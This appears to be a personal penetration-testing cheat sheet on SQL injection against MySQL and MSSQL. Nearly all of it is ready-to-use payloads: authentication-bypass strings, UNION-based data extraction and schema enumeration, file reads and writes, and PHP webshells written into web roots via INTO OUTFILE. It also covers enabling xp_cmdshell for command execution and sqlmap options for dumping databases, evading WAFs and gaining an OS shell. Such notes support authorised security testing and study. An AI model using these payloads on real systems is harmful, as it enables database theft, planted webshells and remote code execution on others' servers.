* Inject unsanitized strings containing SQL payloads which executes unintended SQL commands.
* SQLi Discovery payloads:
	* `'`, `""`, `#`, `;`, `)`
	* URL encoded: `%27`, `%22`, `%23`, `%3B`, `%29`
* Basic MySQL payloads:
	* `<user>' -- -` (`<user>` can useful for authentication bypass in login requests)
	* `<val>') -- -`
	*  `' or 1=1 -- -`
	* `' or 1 = 1 -- -`
	* `' or '1'='1 -- -`
	* `' or '1' = '1' -- -`
* Union based injection: Useful for stacking queries if injection results are visible.
	* `' UNION select 1,2,3,4,n union select <val1>, <val2>, <val3>, <valn>  -- -`
* Determine number of columns for a successful union query:
	* `' order by 1,2,3, n -- -`
	* `' UNION select 1,2,3, n -- -`
	* Keep increasing columns in the queries until an `n`th column is found where union queries succeed. 
* MySQl fingerprinting:
	* `SELECT @@version` if its mysql, should print mysql version
	* `SELECT POW(1,1)` if its mysql, should print 1
	* `SELECT SLEEP(5)` if its mysql, should delay response
* `INFORMATION_SCHEMA` queries:
	* Get databases: `select schema_name from INFORMATION_SCHEMA.SCHEMATA-- -`
	* Get tables in database: `select TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='<database name>'-- -`
	* Get columns in a table: `select COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<table name>'-- -`
	* Get all user's privileges: `SELECT grantee, privilege_type FROM information_schema.user_privileges -- -`
* Get current database: `select database(),2,3-- -`
* Get current user: `select 1,user(),2,3-- -`
* Get current user privileges: `SELECT super_priv FROM mysql.user`
* Reading files:
	* Get user privileges and confirm if `FILE` privilege is granted for user.
	* `SELECT LOAD_FILE('<file>');`
* Write files:
	* Get user privileges and confirm if `FILE` privilege is granted for user.
	* Check for variables restricting file writes to a location:`
		* `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`
	* Assuming file write is not restricted to the file pathn by OS.
		* `select '<file contents>' into outfile '<file path>'`
	* File write into RCE:
		* Write webshell into a asp(x), php webserver's web root.
		* Example: `' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`
* Manual MSSQL injection into RCE:
	* MSSQL has xp_cmdshell which can be used to execute shell commands. It is disabled by default and can be enabled by an administrator.
	* Login into mssql using impacket-mssqlclient user:password@ip -windows-auth
	* Use the following commands to enable xp_cmdshell:
		* EXECUTE sp_configure 'show advanced options', 1;
		* RECONFIGURE;
		* EXECUTE sp_configure 'xp_cmdshell', 1;
		* RECONFIGURE;
	* SQL shell: EXECUTE xp_cmdshell 'command';
	* SQL shell can be upgraded to web shell by writing a command in for example php to a file and access it on URL maybe using directory traversal. 
	* Writing a php webshell file using SQL: `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
	* Check for similar techniques in other SQL technologies where its possible that unnecessarily high privilege granted that can be abused for RCE.
* Burp intruder or wfuzz with wordlists for sqli from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) can be way to test sqli.

* sqlmap: Automated SQL injection tool. Not recommended for under the radar.
	* `sqlmap -u <url>?<parameter>=<val>`
	* Can also copy a http request from Burp as a curl command and change curl with sqlmap.
	* sqlmap using a request file (can be obtained using burp): `sqlmap -r <request file>`
	* `*` is the custom injection which can be used at any part of the request to test for sqli.
	* default option with no inputs: `--batch`
	* Cookie option`--cookie='<cookie>'`
	* `--dump` dumps database
	* `--prefix="%'))" --suffix="-- -"` prefixes/suffixes to payloads
	* `--risk=[1|2|3] --level=[1|2|3|4|5]` sets risk and level
	* Sets random user agent: `--random-agent`
	* Anti-CSRF Token Bypass: `--csrf-token=<parameter>`
	* Tamper scripts for WAF bypass example : `--tamper=between,randomcase`
	* File read: `--file-read`
	* File write: `--file-write --file-dest`
	* Webshell or OS shell: `--os-shell --technique=E`
	* `--parse-errors`, `-t`, `-v`, `--proxy` useful for looking into all requests from sqlmap and for looking into errors.
	* Look at SQL map usage for all options such as anti-csrf, tamper scripts (WAF bypass):
		* https://github.com/sqlmapproject/sqlmap/wiki/Usage
	
* SQL injection cheatsheet: https://www.stationx.net/sqlmap-cheat-sheet/
* References: 
	* https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection
	* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
